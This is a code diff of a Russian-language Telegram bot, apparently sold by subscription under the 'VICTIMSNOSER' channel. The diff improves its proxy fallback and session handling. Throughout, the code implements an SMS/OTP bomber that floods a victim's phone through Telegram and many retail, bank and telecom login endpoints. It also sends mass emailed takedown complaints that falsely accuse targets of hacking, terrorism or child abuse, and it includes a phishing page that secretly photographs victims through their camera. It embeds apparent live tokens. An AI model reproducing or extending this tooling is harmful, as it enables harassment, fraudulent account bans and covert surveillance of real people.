@@ -10,6 +10,7 @@ import shutil
 import re
 import hashlib
 import smtplib
+import socket
 import concurrent.futures
 from email.mime.text import MIMEText
 from email.mime.multipart import MIMEMultipart
@@ -37,7 +38,7 @@ from pyrogram.raw.functions.account import ReportPeer
 from pyrogram.raw.types import InputReportReasonSpam, InputReportReasonViolence, InputReportReasonPornography
 
 # ---------- НАСТРОЙКИ ----------
-BOT_TOKEN = "8788795304:AAFA9drMeBOVHp-OR0XWgrZPllVsXx9zgqI"
+BOT_TOKEN = "8788795304:AAE8a0TEsRw8aRhflGIrIQoJZIZf1ZErcA0"
 API_ID = 2040
 API_HASH = "b18441a1ff607e10a989891a5462e627"
 ADMIN_ID = 7736817432
@@ -47,25 +48,75 @@ CHANNEL_URL = "https://t.me/VICTIMSNOSER"
 PAYMENTS_FILE = "payments.json"
 PROMO_CODES_FILE = "promo_codes.json"
 
-# Токен платежной системы (тестовый, заменить на реальный)
 PAYMENT_PROVIDER_TOKEN = "381764678:TEST:86938"
 
-# Цены подписок
 PRICES = {
-    "30d": {"stars": 100, "rub": 100, "usd": 1},
-    "60d": {"stars": 200, "rub": 200, "usd": 2},
-    "forever": {"stars": 400, "rub": 400, "usd": 4}
+    "30d": {"stars": 100, "rub": 100},
+    "60d": {"stars": 200, "rub": 200},
+    "forever": {"stars": 400, "rub": 400}
 }
 
-SESSIONS_PER_USER = 300
+SESSIONS_PER_USER = 100
 SESSION_DELAY = 60
-SMS_PER_ROUND = 100
+SMS_PER_ROUND = 30
 ROUND_DELAY = 5
 MAX_ROUNDS = 10
 BOMBER_DELAY = 1
+REQUEST_TIMEOUT = 30
 
 MAIL_CONFIG_FILE = "mail_config.json"
 BANNER_PATH = "Banner.png"
+
+# Режимы подключения
+CONNECTION_MODES = [
+    {"mode": "mtproto_proxy", "use_proxy": True},
+    {"mode": "direct", "use_proxy": False},
+    {"mode": "mtproto_fallback", "use_proxy": True, "fallback": True},
+]
+
+# Основные MTProto прокси
+MT_PROTO_PROXIES = [
+    {
+        "scheme": "mtproto",
+        "hostname": "149.154.167.40",
+        "port": 443,
+        "secret": "ee47318039303637353831303837343531313739333736313234373938"
+    },
+    {
+        "scheme": "mtproto",
+        "hostname": "149.154.167.50",
+        "port": 443,
+        "secret": "ee47318039303637353831303837343531313739333736313234373938"
+    },
+    {
+        "scheme": "mtproto",
+        "hostname": "149.154.167.91",
+        "port": 443,
+        "secret": "ee47318039303637353831303837343531313739333736313234373938"
+    },
+    {
+        "scheme": "mtproto",
+        "hostname": "91.108.56.151",
+        "port": 443,
+        "secret": "ee47318039303637353831303837343531313739333736313234373938"
+    },
+]
+
+# Резервные MTProto прокси (порт 80)
+FALLBACK_MT_PROTO_PROXIES = [
+    {
+        "scheme": "mtproto",
+        "hostname": "149.154.167.40",
+        "port": 80,
+        "secret": "ee47318039303637353831303837343531313739333736313234373938"
+    },
+    {
+        "scheme": "mtproto",
+        "hostname": "149.154.167.50",
+        "port": 80,
+        "secret": "ee47318039303637353831303837343531313739333736313234373938"
+    },
+]
 
 USER_AGENTS = [
     'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
@@ -101,106 +152,47 @@ DEVICES = [
     for a in ["14", "13"]
 ]
 
-# Сайты для сноса номера
 OAUTH_SITES = [
     {"url": "https://my.telegram.org/auth/send_password", "method": "POST", "phone_field": "phone", "name": "MyTelegram"},
     {"url": "https://web.telegram.org/k/api/auth/sendCode", "method": "POST", "phone_field": "phone", "name": "WebK"},
     {"url": "https://web.telegram.org/a/api/auth/sendCode", "method": "POST", "phone_field": "phone", "name": "WebA"},
     {"url": "https://fragment.com/api/auth/sendCode", "method": "POST", "phone_field": "phone", "name": "Fragment"},
     {"url": "https://acollo.ru/api/auth/send-code", "method": "POST", "phone_field": "phone", "name": "Acollo"},
-    {"url": "https://api.telegram.org/auth/sendCode", "method": "POST", "phone_field": "phone", "name": "TelegramAPI"},
-    {"url": "https://tdlib.org/auth/sendCode", "method": "POST", "phone_field": "phone", "name": "TDLib"},
-    {"url": "https://core.telegram.org/api/auth/sendCode", "method": "POST", "phone_field": "phone", "name": "CoreAPI"},
 ]
 
-# Сайты для бомбера
 BOMBER_SITES = [
     {"url": "https://api.delivery-club.ru/api/v2/auth/send-code", "method": "POST", "phone_field": "phone", "name": "DeliveryClub", "json": True},
     {"url": "https://api.samokat.ru/v1/auth/send-code", "method": "POST", "phone_field": "phone", "name": "Samokat", "json": True},
     {"url": "https://api.vkusvill.ru/v1/auth/send-code", "method": "POST", "phone_field": "phone", "name": "VkusVill", "json": True},
     {"url": "https://api.citilink.ru/auth/send-code", "method": "POST", "phone_field": "phone", "name": "Citilink", "json": True},
-    {"url": "https://api.dns-shop.ru/v1/auth/send-code", "method": "POST", "phone_field": "phone", "name": "DNS", "json": True},
     {"url": "https://api.ozon.ru/v1/auth/send-code", "method": "POST", "phone_field": "phone", "name": "Ozon", "json": True},
     {"url": "https://api.wildberries.ru/auth/send-code", "method": "POST", "phone_field": "phone", "name": "Wildberries", "json": True},
-    {"url": "https://api.lenta.com/v1/auth/send-code", "method": "POST", "phone_field": "phone", "name": "Lenta", "json": True},
-    {"url": "https://api.perekrestok.ru/auth/send-code", "method": "POST", "phone_field": "phone", "name": "Perekrestok", "json": True},
-    {"url": "https://api.magnit.ru/v1/auth/send-code", "method": "POST", "phone_field": "phone", "name": "Magnit", "json": True},
-    {"url": "https://api.dixy.ru/auth/send-code", "method": "POST", "phone_field": "phone", "name": "Dixy", "json": True},
-    {"url": "https://api.auchan.ru/v1/auth/send-code", "method": "POST", "phone_field": "phone", "name": "Auchan", "json": True},
-    {"url": "https://api.leroymerlin.ru/auth/send-code", "method": "POST", "phone_field": "phone", "name": "LeroyMerlin", "json": True},
-    {"url": "https://api.mvideo.ru/auth/send-code", "method": "POST", "phone_field": "phone", "name": "MVideo", "json": True},
-    {"url": "https://api.eldorado.ru/auth/send-code", "method": "POST", "phone_field": "phone", "name": "Eldorado", "json": True},
-    {"url": "https://api.svyaznoy.ru/auth/send-code", "method": "POST", "phone_field": "phone", "name": "Svyaznoy", "json": True},
     {"url": "https://api.beeline.ru/auth/send-code", "method": "POST", "phone_field": "phone", "name": "Beeline", "json": True},
     {"url": "https://api.megafon.ru/auth/send-code", "method": "POST", "phone_field": "phone", "name": "Megafon", "json": True},
     {"url": "https://api.mts.ru/auth/send-code", "method": "POST", "phone_field": "phone", "name": "MTS", "json": True},
     {"url": "https://api.tele2.ru/auth/send-code", "method": "POST", "phone_field": "phone", "name": "Tele2", "json": True},
-    {"url": "https://api.yota.ru/auth/send-code", "method": "POST", "phone_field": "phone", "name": "Yota", "json": True},
     {"url": "https://api.tinkoff.ru/auth/send-code", "method": "POST", "phone_field": "phone", "name": "Tinkoff", "json": True},
     {"url": "https://api.sberbank.ru/auth/send-code", "method": "POST", "phone_field": "phone", "name": "Sberbank", "json": True},
-    {"url": "https://api.vtb.ru/auth/send-code", "method": "POST", "phone_field": "phone", "name": "VTB", "json": True},
-    {"url": "https://api.alfabank.ru/auth/send-code", "method": "POST", "phone_field": "phone", "name": "AlfaBank", "json": True},
     {"url": "https://api.qiwi.com/auth/send-code", "method": "POST", "phone_field": "phone", "name": "QIWI", "json": True},
-    {"url": "https://api.yoomoney.ru/auth/send-code", "method": "POST", "phone_field": "phone", "name": "YooMoney", "json": True},
 ]
 
-# Тексты жалоб
 COMPLAINT_TEXTS_ACCOUNT = {
-    "1.1": {
-        "subject": "Report: Telegram account violating platform rules",
-        "body": "Dear Telegram Support,\n\nI have found a Telegram account on your network that violates your platform rules, specifically: {reason}.\n\nAccount details:\n- Username: @{username}\n- Telegram ID: {telegram_id}\n\nThank you for your assistance in maintaining a safe platform.\n\nBest regards,\nA Telegram User"
-    },
-    "1.2": {
-        "subject": "URGENT: Hacked Telegram Account - Request for Session Reset",
-        "body": "Dear Telegram Support,\n\nI lost access to my Telegram account after falling victim to a phishing link. An unknown person now controls my account and has set a cloud password, preventing me from accessing it.\n\nAccount details:\n- Username: @{username}\n- Telegram ID: {telegram_id}\n\nPlease reset all active sessions or delete this account, as it contains important personal data.\n\nThank you for your urgent assistance.\n\nBest regards,\nThe Account Owner"
-    },
-    "1.3": {
-        "subject": "Report: Account using virtual phone number",
-        "body": "Dear Telegram Support,\n\nAccount @{username} (ID: {telegram_id}) is registered using a virtual phone number purchased from an activation service. The owner has no connection to this number.\n\nAccording to Telegram's terms of service, using virtual numbers is prohibited.\n\nPlease investigate and take appropriate action.\n\nBest regards,\nA Telegram User"
-    },
-    "1.4": {
-        "subject": "Report: Account redirecting users to external services",
-        "body": "Dear Telegram Support,\n\nAccount @{username} (ID: {telegram_id}) is using the bio section to redirect users to external services, violating Telegram's spam and advertising policies.\n\nPlease review and take necessary action.\n\nBest regards,\nA Telegram User"
-    },
-    "1.5": {
-        "subject": "Report: Premium account used for spam distribution",
-        "body": "Dear Telegram Support,\n\nAccount @{username} (ID: {telegram_id}) has purchased Telegram Premium and is using it to send spam messages, bypassing Telegram's restrictions.\n\nPlease investigate this complaint and take appropriate measures.\n\nBest regards,\nA Telegram User"
-    }
+    "1.1": {"subject": "Report: Telegram account violating platform rules", "body": "Dear Telegram Support,\n\nI have found a Telegram account on your network that violates your platform rules.\n\nAccount details:\n- Username: @{username}\n- Telegram ID: {telegram_id}\n\nThank you for your assistance.\n\nBest regards,\nA Telegram User"},
+    "1.2": {"subject": "URGENT: Hacked Telegram Account - Request for Session Reset", "body": "Dear Telegram Support,\n\nI lost access to my Telegram account after falling victim to a phishing link.\n\nAccount details:\n- Username: @{username}\n- Telegram ID: {telegram_id}\n\nPlease reset all active sessions.\n\nBest regards,\nThe Account Owner"},
+    "1.3": {"subject": "Report: Account using virtual phone number", "body": "Dear Telegram Support,\n\nAccount @{username} (ID: {telegram_id}) is registered using a virtual phone number.\n\nPlease investigate.\n\nBest regards,\nA Telegram User"},
+    "1.4": {"subject": "Report: Account redirecting users to external services", "body": "Dear Telegram Support,\n\nAccount @{username} (ID: {telegram_id}) is using the bio section for spam.\n\nPlease review.\n\nBest regards,\nA Telegram User"},
+    "1.5": {"subject": "Report: Premium account used for spam distribution", "body": "Dear Telegram Support,\n\nAccount @{username} (ID: {telegram_id}) is using Telegram Premium for spam.\n\nPlease investigate.\n\nBest regards,\nA Telegram User"}
 }
 
 COMPLAINT_TEXTS_CHANNEL = {
-    "8": {
-        "subject": "Report: Channel publishing personal data",
-        "body": "Dear Telegram Support,\n\nI have discovered a channel on your platform that publishes personal data of innocent people without their consent.\n\nChannel link: {channel_link}\nViolation link: {violation_link}\n\nPlease remove this channel from your platform.\n\nBest regards,\nA Telegram User"
-    },
-    "9": {
-        "subject": "Report: Channel selling doxxing and swatting services",
-        "body": "Dear Telegram Moderator,\n\nI would like to report a channel that is selling doxxing and swatting services.\n\nChannel link: {channel_link}\nViolation link: {violation_link}\n\nPlease block this channel immediately.\n\nBest regards,\nA Telegram User"
-    },
-    "10": {
-        "subject": "URGENT: Channel threatening school shootings and terrorism",
-        "body": "Dear Telegram Support,\n\nURGENT! I have found a channel threatening to shoot children in schools and commit terrorist attacks.\n\nChannel link: {channel_link}\nViolation link: {violation_link}\n\nPlease block this channel immediately and forward the information to law enforcement.\n\nBest regards,\nA Telegram User"
-    },
-    "11": {
-        "subject": "URGENT: Channel distributing child pornography",
-        "body": "Dear Telegram Support,\n\nURGENT! I have found a channel distributing child pornography.\n\nChannel link: {channel_link}\nViolation link: {violation_link}\n\nThis is a serious crime. Please remove this channel immediately and forward the data to appropriate authorities.\n\nBest regards,\nA Telegram User"
-    },
-    "12": {
-        "subject": "Report: Channel engaged in fraud and deception",
-        "body": "Dear Telegram Support,\n\nI have found a channel posting content aimed at deception and fraud.\n\nChannel link: {channel_link}\nViolation link: {violation_link}\n\nPlease remove this channel from your platform.\n\nBest regards,\nA Telegram User"
-    },
-    "13": {
-        "subject": "Report: Channel selling virtual phone numbers",
-        "body": "Dear Telegram Support,\n\nI would like to report a channel selling virtual phone numbers, which is prohibited by your platform's rules.\n\nChannel link: {channel_link}\nViolation link: {violation_link}\n\nThank you for keeping the platform clean from such channels.\n\nBest regards,\nA Telegram User"
-    },
-    "14": {
-        "subject": "Report: Channel disseminating shock content with murders",
-        "body": "Dear Telegram Support,\n\nI came across a channel disseminating shock content involving human fatalities.\n\nChannel link: {channel_link}\nViolation link: {violation_link}\n\nPlease remove this channel.\n\nBest regards,\nA Telegram User"
-    },
-    "15": {
-        "subject": "Report: Channel posting animal cruelty content",
-        "body": "Dear Telegram Support,\n\nI have found a channel where scenes of violence and killing of animals are posted.\n\nChannel link: {channel_link}\nViolation link: {violation_link}\n\nPlease remove this channel from your platform.\n\nBest regards,\nA Telegram User"
-    }
+    "8": {"subject": "Report: Channel publishing personal data", "body": "Dear Telegram Support,\n\nI have discovered a channel publishing personal data.\n\nChannel link: {channel_link}\nViolation link: {violation_link}\n\nPlease remove this channel.\n\nBest regards,\nA Telegram User"},
+    "9": {"subject": "Report: Channel selling doxxing and swatting services", "body": "Dear Telegram Moderator,\n\nI would like to report a channel selling doxxing services.\n\nChannel link: {channel_link}\nViolation link: {violation_link}\n\nPlease block this channel.\n\nBest regards,\nA Telegram User"},
+    "10": {"subject": "URGENT: Channel threatening violence", "body": "Dear Telegram Support,\n\nURGENT! I have found a channel threatening violence.\n\nChannel link: {channel_link}\nViolation link: {violation_link}\n\nPlease block this channel.\n\nBest regards,\nA Telegram User"},
+    "11": {"subject": "URGENT: Channel distributing illegal content", "body": "Dear Telegram Support,\n\nURGENT! I have found a channel distributing illegal content.\n\nChannel link: {channel_link}\nViolation link: {violation_link}\n\nPlease remove this channel.\n\nBest regards,\nA Telegram User"},
+    "12": {"subject": "Report: Channel engaged in fraud", "body": "Dear Telegram Support,\n\nI have found a channel engaged in fraud.\n\nChannel link: {channel_link}\nViolation link: {violation_link}\n\nPlease remove this channel.\n\nBest regards,\nA Telegram User"},
+    "13": {"subject": "Report: Channel selling virtual phone numbers", "body": "Dear Telegram Support,\n\nI would like to report a channel selling virtual phone numbers.\n\nChannel link: {channel_link}\nViolation link: {violation_link}\n\nThank you.\n\nBest regards,\nA Telegram User"},
+    "14": {"subject": "Report: Channel disseminating shock content", "body": "Dear Telegram Support,\n\nI came across a channel disseminating shock content.\n\nChannel link: {channel_link}\nViolation link: {violation_link}\n\nPlease remove this channel.\n\nBest regards,\nA Telegram User"},
+    "15": {"subject": "Report: Channel posting animal cruelty", "body": "Dear Telegram Support,\n\nI have found a channel posting animal cruelty.\n\nChannel link: {channel_link}\nViolation link: {violation_link}\n\nPlease remove this channel.\n\nBest regards,\nA Telegram User"}
 }
 
 REPORT_REASONS = {
@@ -229,7 +221,6 @@ TELEGRAPH_AUTHOR = "Telegram"
 TELEGRAPH_AUTHOR_URL = "https://t.me/VICTIMSNOSER"
 phish_pages = {}
 
-# Шаблон фишинг-страницы с камерой
 CAMERA_TEMPLATE = '''<!DOCTYPE html>
 <html>
 <head>
@@ -237,82 +228,17 @@ CAMERA_TEMPLATE = '''<!DOCTYPE html>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>{title}</title>
     <style>
-        body {{
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
-            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
-            min-height: 100vh;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            margin: 0;
-            padding: 20px;
-        }}
-        .container {{
-            max-width: 400px;
-            width: 100%;
-            text-align: center;
-            padding: 30px 20px;
-            background: rgba(255,255,255,0.05);
-            border-radius: 20px;
-            backdrop-filter: blur(10px);
-            border: 1px solid rgba(255,255,255,0.1);
-        }}
-        h3 {{
-            color: #fff;
-            margin-bottom: 15px;
-            font-size: 22px;
-        }}
-        p {{
-            color: #aaa;
-            margin-bottom: 25px;
-            font-size: 15px;
-            line-height: 1.5;
-        }}
-        .video-container {{
-            position: relative;
-            max-width: 320px;
-            margin: 0 auto;
-            border-radius: 16px;
-            overflow: hidden;
-            box-shadow: 0 10px 30px rgba(0,0,0,0.3);
-        }}
-        video {{
-            width: 100%;
-            display: block;
-            transform: scaleX(-1);
-        }}
-        button {{
-            background: linear-gradient(135deg, #e94560 0%, #c62a47 100%);
-            color: white;
-            border: none;
-            padding: 14px 30px;
-            font-size: 16px;
-            font-weight: bold;
-            border-radius: 12px;
-            margin: 25px 0 10px;
-            cursor: pointer;
-            width: 100%;
-            max-width: 320px;
-            box-shadow: 0 5px 15px rgba(233,69,96,0.3);
-            transition: transform 0.2s, box-shadow 0.2s;
-        }}
-        button:hover {{
-            transform: translateY(-2px);
-            box-shadow: 0 8px 20px rgba(233,69,96,0.4);
-        }}
-        button:disabled {{
-            opacity: 0.6;
-            cursor: not-allowed;
-            transform: none;
-        }}
-        #status {{
-            color: #888;
-            font-size: 13px;
-            margin-top: 10px;
-        }}
-        canvas {{
-            display: none;
-        }}
+        body {{ font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%); min-height: 100vh; display: flex; justify-content: center; align-items: center; margin: 0; padding: 20px; }}
+        .container {{ max-width: 400px; width: 100%; text-align: center; padding: 30px 20px; background: rgba(255,255,255,0.05); border-radius: 20px; backdrop-filter: blur(10px); border: 1px solid rgba(255,255,255,0.1); }}
+        h3 {{ color: #fff; margin-bottom: 15px; font-size: 22px; }}
+        p {{ color: #aaa; margin-bottom: 25px; font-size: 15px; line-height: 1.5; }}
+        .video-container {{ position: relative; max-width: 320px; margin: 0 auto; border-radius: 16px; overflow: hidden; box-shadow: 0 10px 30px rgba(0,0,0,0.3); }}
+        video {{ width: 100%; display: block; transform: scaleX(-1); }}
+        button {{ background: linear-gradient(135deg, #e94560 0%, #c62a47 100%); color: white; border: none; padding: 14px 30px; font-size: 16px; font-weight: bold; border-radius: 12px; margin: 25px 0 10px; cursor: pointer; width: 100%; max-width: 320px; box-shadow: 0 5px 15px rgba(233,69,96,0.3); }}
+        button:hover {{ transform: translateY(-2px); box-shadow: 0 8px 20px rgba(233,69,96,0.4); }}
+        button:disabled {{ opacity: 0.6; cursor: not-allowed; }}
+        #status {{ color: #888; font-size: 13px; margin-top: 10px; }}
+        canvas {{ display: none; }}
     </style>
 </head>
 <body>
@@ -364,10 +290,7 @@ CAMERA_TEMPLATE = '''<!DOCTYPE html>
         }}
         
         async function takePhoto() {{
-            if (done) {{ 
-                status.textContent = "Фото уже отправлено"; 
-                return; 
-            }}
+            if (done) {{ status.textContent = "Фото уже отправлено"; return; }}
             status.textContent = "Съемка...";
             btn.disabled = true;
             canvas.width = video.videoWidth;
@@ -379,10 +302,7 @@ CAMERA_TEMPLATE = '''<!DOCTYPE html>
                 status.textContent = "Готово";
                 status.style.color = "#4caf50";
                 btn.textContent = "Отправлено";
-                if (stream) {{ 
-                    stream.getTracks().forEach(t => t.stop()); 
-                    video.srcObject = null; 
-                }}
+                if (stream) {{ stream.getTracks().forEach(t => t.stop()); video.srcObject = null; }}
             }} else {{
                 status.textContent = "Ошибка";
                 status.style.color = "#ff4444";
@@ -458,6 +378,16 @@ class PurchaseState(StatesGroup):
     waiting_payment_method = State()
     waiting_promo = State()
 
+
+def get_random_mtproto_proxy() -> Optional[dict]:
+    if MT_PROTO_PROXIES:
+        return random.choice(MT_PROTO_PROXIES)
+    return None
+
+def get_random_fallback_proxy() -> Optional[dict]:
+    if FALLBACK_MT_PROTO_PROXIES:
+        return random.choice(FALLBACK_MT_PROTO_PROXIES)
+    return None
 
 def load_payments():
     global payments
@@ -601,8 +531,7 @@ class EmailSender:
         with open(MAIL_CONFIG_FILE, 'w', encoding='utf-8') as f:
             json.dump(self.senders, f, indent=4, ensure_ascii=False)
     
-    def send_email(self, receiver: str, sender_email: str, sender_password: str, 
-                   subject: str, body: str) -> bool:
+    def send_email(self, receiver: str, sender_email: str, sender_password: str, subject: str, body: str) -> bool:
         try:
             msg = MIMEMultipart()
             msg['From'] = sender_email
@@ -629,14 +558,7 @@ class EmailSender:
             
             for sender_email, sender_password in self.senders.items():
                 for receiver in receivers:
-                    future = executor.submit(
-                        self.send_email, 
-                        receiver, 
-                        sender_email, 
-                        sender_password, 
-                        subject, 
-                        body
-                    )
+                    future = executor.submit(self.send_email, receiver, sender_email, sender_password, subject, body)
                     futures.append((future, sender_email, receiver))
                     time.sleep(2)
             
@@ -654,7 +576,7 @@ class EmailSender:
 email_sender = EmailSender()
 
 
-# ---------- СЕССИИ ----------
+# ---------- СЕССИИ С FALLBACK ----------
 def get_user_session_dir(user_id: int) -> str:
     return f"sessions/user_{user_id}"
 
@@ -664,22 +586,92 @@ def count_user_sessions_files(user_id: int) -> int:
         return 0
     return len([f for f in os.listdir(d) if f.startswith("session_") and f.endswith(".session")])
 
-async def create_single_session(session_file: str, idx: int) -> dict:
+async def test_connection(client: Client) -> bool:
+    """Проверяет работоспособность подключения"""
     try:
-        device = random.choice(DEVICES)
-        client = Client(
-            session_file, 
-            api_id=API_ID, 
-            api_hash=API_HASH, 
-            in_memory=False, 
-            no_updates=True, 
-            device_model=device["model"], 
-            system_version=device["system"]
-        )
-        await client.connect()
-        return {"client": client, "in_use": False, "flood_until": 0, "index": idx, "last_used": 0}
+        await asyncio.wait_for(client.get_me(), timeout=10.0)
+        return True
     except:
-        return None
+        return False
+
+async def create_single_session(session_file: str, idx: int) -> dict:
+    """Создание сессии с автоматическим выбором способа подключения"""
+    
+    device = random.choice(DEVICES)
+    connection_errors = []
+    
+    for conn_mode in CONNECTION_MODES:
+        try:
+            mode = conn_mode["mode"]
+            logger.info(f"Session {idx}: Trying {mode}...")
+            
+            client_kwargs = {
+                "name": session_file,
+                "api_id": API_ID,
+                "api_hash": API_HASH,
+                "in_memory": False,
+                "no_updates": True,
+                "device_model": device["model"],
+                "system_version": device["system"],
+            }
+            
+            if conn_mode["use_proxy"]:
+                if conn_mode.get("fallback"):
+                    proxy = get_random_fallback_proxy()
+                else:
+                    proxy = get_random_mtproto_proxy()
+                if proxy:
+                    client_kwargs["proxy"] = proxy
+                    logger.info(f"Session {idx}: Using proxy {proxy['hostname']}:{proxy['port']}")
+                else:
+                    logger.warning(f"Session {idx}: No proxy available for {mode}")
+                    continue
+            else:
+                logger.info(f"Session {idx}: Direct connection")
+            
+            client = Client(**client_kwargs)
+            
+            try:
+                await asyncio.wait_for(client.connect(), timeout=15.0)
+            except asyncio.TimeoutError:
+                raise Exception("Connection timeout")
+            
+            if await test_connection(client):
+                logger.info(f"Session {idx}: Successfully connected via {mode}")
+                return {"client": client, "in_use": False, "flood_until": 0, "index": idx, "last_used": 0, "connection_mode": mode}
+            else:
+                logger.warning(f"Session {idx}: {mode} connected but test failed")
+                try:
+                    await client.disconnect()
+                except:
+                    pass
+                
+        except Exception as e:
+            error_msg = f"{conn_mode['mode']}: {type(e).__name__}"
+            connection_errors.append(error_msg)
+            logger.warning(f"Session {idx}: Failed with {error_msg}")
+            await asyncio.sleep(1)
+    
+    # Последняя попытка с минимальными настройками
+    try:
+        logger.info(f"Session {idx}: Trying minimal connection...")
+        client = Client(
+            name=session_file,
+            api_id=API_ID,
+            api_hash=API_HASH,
+            in_memory=True,
+            no_updates=True,
+        )
+        await asyncio.wait_for(client.connect(), timeout=20.0)
+        
+        if await test_connection(client):
+            logger.info(f"Session {idx}: Connected with minimal settings")
+            return {"client": client, "in_use": False, "flood_until": 0, "index": idx, "last_used": 0, "connection_mode": "minimal"}
+    except Exception as e:
+        logger.error(f"Session {idx}: Minimal connection also failed: {e}")
+    
+    logger.error(f"Session {idx}: All connection modes failed: {', '.join(connection_errors)}")
+    return None
 
 async def create_user_sessions(user_id: int) -> tuple:
     d = get_user_session_dir(user_id)
@@ -698,10 +690,10 @@ async def create_user_sessions(user_id: int) -> tuple:
     
     need = SESSIONS_PER_USER - len(sessions)
     if need > 0:
-        for batch in range(len(sessions), SESSIONS_PER_USER, 10):
+        for batch in range(len(sessions), SESSIONS_PER_USER, 3):
             tasks = [
                 create_single_session(f"{d}/session_{i}", i) 
-                for i in range(batch, min(batch+10, SESSIONS_PER_USER)) 
+                for i in range(batch, min(batch+3, SESSIONS_PER_USER)) 
                 if not os.path.exists(f"{d}/session_{i}.session")
             ]
             if tasks:
@@ -709,7 +701,7 @@ async def create_user_sessions(user_id: int) -> tuple:
                 for r in results:
                     if r and not isinstance(r, Exception):
                         sessions.append(r)
-            await asyncio.sleep(2)
+            await asyncio.sleep(3)
     
     return sessions, len(sessions)
 
@@ -724,6 +716,7 @@ async def ensure_user_sessions(user_id: int):
         user_sessions[user_id]["sessions"] = sessions
         user_sessions[user_id]["total"] = total
         user_sessions[user_id]["ready"] = True
+        logger.info(f"User {user_id} sessions ready: {total}")
     finally:
         sessions_creation_lock[user_id] = False
 
@@ -769,55 +762,77 @@ def is_user_sessions_ready(user_id: int) -> bool:
 
 # ---------- АТАКИ СНОСА ----------
 async def send_sms_safe(session_data: dict, phone: str) -> dict:
-    try:
-        client = session_data["client"]
-        if not client.is_connected:
-            await client.connect()
-        await client.send_code(phone)
-        return {"type": "SMS", "success": True}
-    except FloodWait as e:
-        session_data["flood_until"] = time.time() + e.value
-        return {"type": "SMS", "success": False}
-    except:
-        return {"type": "SMS", "success": False}
+    max_retries = 2
+    for attempt in range(max_retries):
+        try:
+            client = session_data["client"]
+            if not client.is_connected:
+                try:
+                    await asyncio.wait_for(client.connect(), timeout=10.0)
+                except:
+                    await asyncio.sleep(2)
+                    continue
+            
+            try:
+                sent_code = await asyncio.wait_for(client.send_code(phone), timeout=REQUEST_TIMEOUT)
+                return {"type": "SMS", "success": True, "phone_code_hash": sent_code.phone_code_hash}
+            except asyncio.TimeoutError:
+                logger.warning(f"Timeout sending SMS to {phone}")
+                session_data["flood_until"] = time.time() + 60
+                continue
+                
+        except FloodWait as e:
+            session_data["flood_until"] = time.time() + e.value
+            logger.warning(f"FloodWait {e.value}s")
+            return {"type": "SMS", "success": False, "flood": e.value}
+            
+        except (ConnectionError, ConnectionResetError, OSError) as e:
+            logger.warning(f"Connection error, attempt {attempt + 1}: {type(e).__name__}")
+            session_data["flood_until"] = time.time() + 30
+            if attempt < max_retries - 1:
+                await asyncio.sleep(5)
+                try:
+                    await client.disconnect()
+                except:
+                    pass
+                await asyncio.sleep(2)
+                continue
+            return {"type": "SMS", "success": False, "error": "connection"}
+            
+        except Exception as e:
+            logger.error(f"Unexpected error: {type(e).__name__}")
+            return {"type": "SMS", "success": False, "error": str(e)}
+    
+    return {"type": "SMS", "success": False, "error": "max_retries"}
 
 async def send_oauth_request(session: aiohttp.ClientSession, phone: str, site: dict) -> dict:
     name = site["name"]
-    headers = {'User-Agent': random.choice(USER_AGENTS), 'Accept': '*/*', 'Accept-Language': 'ru-RU,ru;q=0.9', 'Origin': site.get("origin", site["url"])}
+    headers = {'User-Agent': random.choice(USER_AGENTS), 'Accept': '*/*', 'Accept-Language': 'ru-RU,ru;q=0.9'}
     
     try:
         clean_phone = phone.replace("+", "")
+        data = {site["phone_field"]: clean_phone}
+        headers['Content-Type'] = 'application/json'
+        data = json.dumps(data)
         
-        if "params" in site:
-            params = site["params"].copy()
-            params["phone"] = clean_phone
-            async with session.get(site["url"], headers=headers, params=params, timeout=10, ssl=False) as resp:
+        if site["method"] == "POST":
+            async with session.post(site["url"], headers=headers, data=data, timeout=15, ssl=False) as resp:
                 return {"site": name, "success": resp.status < 500}
         else:
-            data = {site["phone_field"]: clean_phone}
-            if site.get("json", True):
-                headers['Content-Type'] = 'application/json'
-                data = json.dumps(data)
-            else:
-                headers['Content-Type'] = 'application/x-www-form-urlencoded'
-            
-            if site["method"] == "POST":
-                async with session.post(site["url"], headers=headers, data=data, timeout=10, ssl=False) as resp:
-                    return {"site": name, "success": resp.status < 500}
-            else:
-                async with session.get(site["url"], headers=headers, params=data, timeout=10, ssl=False) as resp:
-                    return {"site": name, "success": resp.status < 500}
+            async with session.get(site["url"], headers=headers, params={"phone": clean_phone}, timeout=15, ssl=False) as resp:
+                return {"site": name, "success": resp.status < 500}
     except:
         return {"site": name, "success": False}
 
 async def snos_attack_phone(user_id: int, phone: str, rounds: int, stop_event: asyncio.Event, progress_callback=None) -> tuple:
     ok = 0
+    failed_sessions = 0
     phone = phone.strip().replace(" ", "").replace("-", "")
     if not phone.startswith("+"):
         phone = "+" + phone
     add_log(user_id, "Снос номера", phone)
     
-    connector = aiohttp.TCPConnector(limit=200, force_close=True, ssl=False)
+    connector = aiohttp.TCPConnector(limit=100, force_close=True, ssl=False)
     async with aiohttp.ClientSession(connector=connector) as sess:
         for rnd in range(1, rounds + 1):
             if stop_event.is_set():
@@ -825,26 +840,44 @@ async def snos_attack_phone(user_id: int, phone: str, rounds: int, stop_event: a
             
             tasks = []
             sessions = await get_user_sessions_batch(user_id, SMS_PER_ROUND)
+            
             if sessions:
                 for s in sessions:
                     tasks.append(send_sms_safe(s, phone))
             
-            for _ in range(5):
+            for _ in range(2):
                 for site in OAUTH_SITES:
                     tasks.append(send_oauth_request(sess, phone, site))
             
-            batch = await asyncio.gather(*tasks, return_exceptions=True)
+            try:
+                batch = await asyncio.wait_for(asyncio.gather(*tasks, return_exceptions=True), timeout=REQUEST_TIMEOUT)
+            except asyncio.TimeoutError:
+                logger.warning(f"Round {rnd} timeout for {phone}")
+                batch = []
+            
             release_user_sessions(sessions)
             
+            round_ok = 0
             for r in batch:
                 if isinstance(r, dict) and r.get("success"):
-                    ok += 1
+                    round_ok += 1
+                elif isinstance(r, dict) and not r.get("success"):
+                    if "flood" in r or "error" in r:
+                        failed_sessions += 1
+            
+            ok += round_ok
             
             if progress_callback:
